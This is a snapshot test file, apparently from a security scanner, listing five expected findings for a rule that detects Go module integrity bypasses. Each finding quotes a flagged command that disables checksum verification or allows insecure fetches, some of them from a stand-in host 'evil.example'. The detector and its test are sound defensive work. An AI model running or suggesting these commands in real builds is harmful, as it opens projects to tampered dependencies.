@@ -1,0 +1,61 @@
+---
+source: src/rules/builtin/supplychain.rs
+expression: findings
+---
+[
+  {
+    "id": "SC-009",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Go module integrity bypass",
+    "line": 8,
+    "code": "GOINSECURE=* go get evil.example/pkg",
+    "message": "Go module integrity bypass: checksum verification is disabled or insecure module fetches are allowed, enabling dependency tampering or MITM.",
+    "recommendation": "Keep GOSUMDB enabled and never set GOINSECURE/GONOSUMCHECK or -insecure. Verify modules against the checksum database."
+  },
+  {
+    "id": "SC-009",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Go module integrity bypass",
+    "line": 9,
+    "code": "GOSUMDB=off go build ./...",
+    "message": "Go module integrity bypass: checksum verification is disabled or insecure module fetches are allowed, enabling dependency tampering or MITM.",
+    "recommendation": "Keep GOSUMDB enabled and never set GOINSECURE/GONOSUMCHECK or -insecure. Verify modules against the checksum database."
+  },
+  {
+    "id": "SC-009",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Go module integrity bypass",
+    "line": 10,
+    "code": "go env -w GOFLAGS=-insecure",
+    "message": "Go module integrity bypass: checksum verification is disabled or insecure module fetches are allowed, enabling dependency tampering or MITM.",
+    "recommendation": "Keep GOSUMDB enabled and never set GOINSECURE/GONOSUMCHECK or -insecure. Verify modules against the checksum database."
+  },
+  {
+    "id": "SC-009",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Go module integrity bypass",
+    "line": 11,
+    "code": "go get -insecure evil.example/pkg",
+    "message": "Go module integrity bypass: checksum verification is disabled or insecure module fetches are allowed, enabling dependency tampering or MITM.",
+    "recommendation": "Keep GOSUMDB enabled and never set GOINSECURE/GONOSUMCHECK or -insecure. Verify modules against the checksum database."
+  },
+  {
+    "id": "SC-009",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Go module integrity bypass",
+    "line": 12,
+    "code": "export GONOSUMCHECK=1",
+    "message": "Go module integrity bypass: checksum verification is disabled or insecure module fetches are allowed, enabling dependency tampering or MITM.",
+    "recommendation": "Keep GOSUMDB enabled and never set GOINSECURE/GONOSUMCHECK or -insecure. Verify modules against the checksum database."
+  }
+]
